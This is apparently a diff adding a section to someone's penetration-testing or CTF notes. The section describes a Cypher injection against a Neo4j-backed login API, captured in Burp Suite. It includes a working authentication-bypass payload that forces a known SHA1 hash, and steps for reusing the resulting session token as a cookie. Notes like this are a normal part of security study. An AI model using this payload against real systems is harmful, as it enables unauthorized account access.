@@ -209,8 +209,30 @@ Open login webpage in burpe suite
 - capture login request on proxy HTTP history
 - send POST request to repeater
 - change username and password values to exploits
-
 ```
+
+### Neo4j exploit 
+Enumerated login page with burpsuite revealed http website is using neo4j to store login details
+- ran login auth in burp suite
+- found note // TODO: don't store user accounts in neo4j
+- Captured POST /api/auth JSON request in Burp { "username": "admin", "password": "test" }
+- Tried Boolean bypass payloads in username and password fields.
+
+CASE:
+```
+'MATCH (u:USER)-[:SECRET]->(h:SHA1) 
+WHERE u.name = '<input>'
+RETURN h.value AS hash'
+```
+- Found db_hash = results[0]["hash"]
+- Payload to inject known SHA1 hash that matched password
+'''{
+  "username": "' OR 1=1 RETURN '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8' AS hash //",
+  "password": "password"
+}'''
+- obtain valid session token
+- modify burp request - in repeater change Cookie in header options to the access token above
+- Cookie: access-token=<JWT>
 
 ### Log poisoning
 Desmonds notes
